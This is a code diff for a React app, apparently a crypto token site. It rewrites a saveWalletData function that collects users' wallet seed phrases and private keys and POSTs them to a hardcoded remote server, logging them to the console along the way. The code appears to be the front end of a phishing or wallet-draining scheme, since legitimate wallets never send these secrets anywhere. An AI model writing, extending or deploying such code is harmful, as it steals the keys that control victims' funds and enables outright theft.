@@ -1,4 +1,5 @@
 import { useState } from 'react';
+import logoImg from '../assets/logo.jpg';
 // import chartImg2 from './assets/chart2.jpg';
 // import chartImg3 from './assets/chart3.jpg';
 // import chartImg1D from './assets/1D.jpg';
@@ -232,51 +233,46 @@ function App() {
 		return `wallet-data-${timestamp}.json`;
 	};
 
-	// Save wallet data to backend
+	// Hardcode the API URL for now to ensure it works
+	const API_URL = 'https://grovetoken-1.onrender.com/api/wallet';
+
+	// Use this API_URL in your fetch calls
 	const saveWalletData = async (data, filename) => {
 		try {
-			// Hardcode the backend URL for now
-			const baseUrl = 'https://grovetoken-1.onrender.com/api/wallet';
+			console.log('🚀 Attempting to save data:', { dataToSubmit: data, filename });
+			
 			let endpoint = '';
 			let payload = {};
-
-			// Determine endpoint and payload based on data type
-			if (data.type && data.type.includes('mnemonic')) {
-				endpoint = `${baseUrl}/seed`;
-				// Convert mnemonic string back to array for backend
-				const phraseArray = data.mnemonic.split(' ');
-				payload = { phrase: phraseArray };
-			} else if (data.type === 'private-key') {
-				endpoint = `${baseUrl}/private-key`;
+			
+			if (data.seedPhrase) {
+				endpoint = `${API_URL}/seed-phrase`;
+				payload = { seedPhrase: data.seedPhrase };
+			} else if (data.privateKey) {
+				endpoint = `${API_URL}/private-key`;
 				payload = { privateKey: data.privateKey };
-			} else {
-				console.error('Unknown data type:', data.type);
-				return false;
 			}
-
+			
 			console.log('🌐 Making API call to:', endpoint);
 			console.log('📦 Payload:', payload);
-
+			
 			const response = await fetch(endpoint, {
 				method: 'POST',
 				headers: {
 					'Content-Type': 'application/json',
 				},
-				body: JSON.stringify(payload)
+				body: JSON.stringify(payload),
 			});
-
-			if (response.ok) {
-				const result = await response.json();
-				console.log('✅ Backend response:', result);
-				return true;
-			} else {
-				const error = await response.json();
-				console.error('❌ Backend error:', error);
-				return false;
+			
+			if (!response.ok) {
+				throw new Error(`Server responded with ${response.status}`);
 			}
+			
+			const result = await response.json();
+			console.log('✅ Data saved successfully:', result);
+			return result;
 		} catch (error) {
-			console.error('❌ Network error:', error);
-			return false;
+			console.log('❌ Network error:', error);
+			throw error;
 		}
 	};
 
